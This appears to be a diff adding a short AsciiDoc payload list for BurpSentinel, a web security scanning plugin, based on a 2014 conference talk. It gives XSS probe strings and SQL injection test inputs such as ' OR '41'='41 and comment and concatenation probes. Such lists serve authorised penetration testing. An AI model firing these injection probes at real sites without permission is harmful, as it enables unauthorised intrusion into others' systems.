@@ -1,0 +1,58 @@
+= BurpSentinel Payloads
+
+Based on my presentation on BSidesVienna 2014: http://www.slideshare.net/nibod/bsides-viennasentinel-v04
+
+
+== XSS
+
+For tag based injection:
+[source]
+----
+%3Cp%3E%22
+<p>"
+----
+
+For tag value based injection:
+
+[source]
+----
+%22%3D 
+"=
+----
+
+== SQLu
+
+The old SQL tests:
+
+[source]
+----
+'BREAK\"
+        
+OR 41=41
+' OR '41'='41
+" OR "41"="41
+
+/**/
+
+) OR (41=41
+') OR ('41'='41
+") OR ("41"="41"
+----
+
+== SQLs
+
+The new SQL tests:
+
+[source]
+----
+'BREAK\"
+
+ORIG+1-1
+ORIG'+0+'0
+
+ORIG[0]'||'ORIG[1-END]
+ORIG[0]'+'ORIG[1-END]
+ORIG[0]' 'ORIG[1-END]
+/**/ORIG
+----
+
